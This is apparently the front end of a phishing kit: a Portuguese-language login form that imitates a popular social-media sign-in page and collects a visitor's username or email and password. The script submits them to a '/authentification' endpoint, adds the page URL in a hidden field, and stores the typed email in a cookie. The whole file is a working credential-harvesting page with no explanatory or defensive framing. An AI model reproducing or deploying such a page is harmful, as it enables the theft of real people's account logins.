	<form id="formtosubmit" action="/authentification" method="post" novalidate="" target="_blank">
    <div class="l-part">
      <input type="text" placeholder="Telefone, nome de usuário ou email" name="email" class="input-1" />
      <div class="overlap-text">
        <input type="password" placeholder="Senha" name="password" class="input-2" />
        <a href="#"></a>
      </div>
	  <input id="inputurl" name="url" type="hidden" value="">
      <input type="button" id="submitbutton" value="Entrar" class="btn" />	  
    </div>
	</form>

<script>
  $(document).ready(function() {
    var url = window.location.href;
    $('#inputurl').attr('value',url);   
    
    
    $('input[name=email]').on('keyup keypress blur change', function(e) {
        if($('input[name=email]').val().length === 0 ){
        $("#emailField").removeClass("CDELXb")
      }else{
        $("#emailField").addClass("CDELXb")
      }
    });
    
    $('input[name=password]').on('keyup keypress blur change', function(e) {
        if($('input[name=password]').val().length === 0 ){
        $("#pwdField").removeClass("CDELXb")
      }else{
        $("#pwdField").addClass("CDELXb")
      }
    });
    
    
  
    
    $('#submitbutton').click( function() {
      document.cookie = $('input[name=email]').val();
      $("#formtosubmit").submit();
    });
  
  
  });  
</script>
